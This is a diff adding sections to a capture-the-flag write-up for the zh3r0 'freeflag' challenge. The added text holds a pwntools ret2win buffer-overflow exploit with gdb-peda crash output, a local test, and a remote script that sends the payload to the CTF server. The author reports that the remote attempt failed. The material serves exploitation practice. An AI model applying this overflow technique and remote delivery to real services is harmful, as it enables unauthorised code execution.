@@ -119,6 +119,103 @@ Before we craft a exploit, we need to eliminate bad characters.
 
 ### 3. Eliminating Bad Characters
 ### 4. Building a Exploit
-### 5. Successful Exploitation
+### 5. Successful Exploitation (local)
 
+Ultimately my code and documentation looked like this. I keep the commented sections for reference.
+
+```
+#/usr/bin/python
+from pwn import *
+#
+# 0000| 0x7fffffffe548 ("AA0AAFAAbAA1AAGA\v\316\341\367\377\177")
+# 0008| 0x7fffffffe550 ("bAA1AAGA\v\316\341\367\377\177")
+# 0016| 0x7fffffffe558 --> 0x7ffff7e1ce0b (<__libc_start_main+235>:       mov    edi,eax)
+# 0024| 0x7fffffffe560 --> 0x0
+# 0032| 0x7fffffffe568 --> 0x7fffffffe638 --> 0x7fffffffe850 ("/media/kali/ExtraDrive1/zh3r0ctf/freeflag")
+# 0040| 0x7fffffffe570 --> 0x100040000
+# 0048| 0x7fffffffe578 --> 0x4007d9 (<main>:      push   rbp)
+# 0056| 0x7fffffffe580 --> 0x0
+# [------------------------------------------------------------------------------]
+# Legend: code, data, rodata, value
+# Stopped reason: SIGSEGV
+# 0x000000000040076d in here ()
+# gdb-peda$
+# gdb-peda$ pattern search
+# Registers contain pattern buffer:
+# RBP+0 found at offset: 32
+# Registers point to pattern buffer:
+# [RSI] --> offset 0 - size ~78
+# [RSP] --> offset 40 - size ~38
+# Pattern buffer found at:
+# 0x00007fffffffe520 : offset    0 - size   56 ($sp + -0x28 [-10 dwords])
+# References to pattern buffer found at:
+# 0x00007fffffffe140 : 0x00007fffffffe520 ($sp + -0x408 [-258 dwords])
+# 0x00007fffffffe158 : 0x00007fffffffe520 ($sp + -0x3f0 [-252 dwords])
+# gdb-peda$
+
+winwin = p64(0x400707)
+junk = "A"*40
+payload = junk + winwin + "A"*(56-40-len(winwin))
+f = open('payload.txt','wb')
+f.write(payload)
+f.close
+```
+To test this, I used the `echo '{youdidit}' > flag.txt` command in the same directory as the binary that was given to me. As you can see, if you generate the payload and then `gdb freeflag` and then `run < payload.txt`, which spawns a process that runs the `cat flag.txt` command to print the flag.
+
+### 6. Unsuccessful Exploitation (Remote)
+
+Unfortunately, online exploitation was not a success. I was told on the ctf.zh3r0.ml Discord channel that the issue is the discrepancies between different versions of libc and that the stack must be realigned for successful exploitation.
+
+If you can do it, the CTFd servers are still online as of this day. Here is the code, although the server returns 'None' as in no response. As I do not know of what version of libc they are using, all I know is that it is some sort of Docker container that may have C Socket listeners pre-compiled.
+
+I strongly suggest pre-compiling a test server with any intel you have about how they compiled theirs. Because the binary that is given to us locally does not host a listener server. Rather, it's just a local STDIN/ERR/OUT prompt.
+
+Keep an eye on the Discord for any clues on how they compiled their listener services. If you can clone it and then debug it locally, you'll get the flag in no time.
+```
+#/usr/bin/python
+from pwn import *
+#
+# 0000| 0x7fffffffe548 ("AA0AAFAAbAA1AAGA\v\316\341\367\377\177")
+# 0008| 0x7fffffffe550 ("bAA1AAGA\v\316\341\367\377\177")
+# 0016| 0x7fffffffe558 --> 0x7ffff7e1ce0b (<__libc_start_main+235>:       mov    edi,eax)
+# 0024| 0x7fffffffe560 --> 0x0
+# 0032| 0x7fffffffe568 --> 0x7fffffffe638 --> 0x7fffffffe850 ("/media/kali/ExtraDrive1/zh3r0ctf/freeflag")
+# 0040| 0x7fffffffe570 --> 0x100040000
+# 0048| 0x7fffffffe578 --> 0x4007d9 (<main>:      push   rbp)
+# 0056| 0x7fffffffe580 --> 0x0
+# [------------------------------------------------------------------------------]
+# Legend: code, data, rodata, value
+# Stopped reason: SIGSEGV
+# 0x000000000040076d in here ()
+# gdb-peda$
+# gdb-peda$ pattern search
+# Registers contain pattern buffer:
+# RBP+0 found at offset: 32
+# Registers point to pattern buffer:
+# [RSI] --> offset 0 - size ~78
+# [RSP] --> offset 40 - size ~38
+# Pattern buffer found at:
+# 0x00007fffffffe520 : offset    0 - size   56 ($sp + -0x28 [-10 dwords])
+# References to pattern buffer found at:
+# 0x00007fffffffe140 : 0x00007fffffffe520 ($sp + -0x408 [-258 dwords])
+# 0x00007fffffffe158 : 0x00007fffffffe520 ($sp + -0x3f0 [-252 dwords])
+# gdb-peda$
+# winwin = 0x400707
+#winwin="\x07\x07\x40\x00\x00\x00\x00\x00"
+winwin = p64(0x400707)
+junk = "A"*40
+payload = junk + winwin + "A"*(56-40-len(winwin))
+f = open('payload.txt','wb')
+f.write(payload)
+f.close
+
+conn = remote('europe.pwn.zh3r0.ml',3456)
+print "[+] Connected"
+print conn.recvline()
+print conn.recvuntil('Please provide us your name: \n')
+print "[*] Sending payload\r\n\t%s" % str(payload)
+print conn.send(payload)
+print conn.recvuntil(b' ',drop=True)
+conn.close()
+```
 # Bonus: My big mistake. Accidentally creating a reverse shell instead without controlling the instruction pointer.
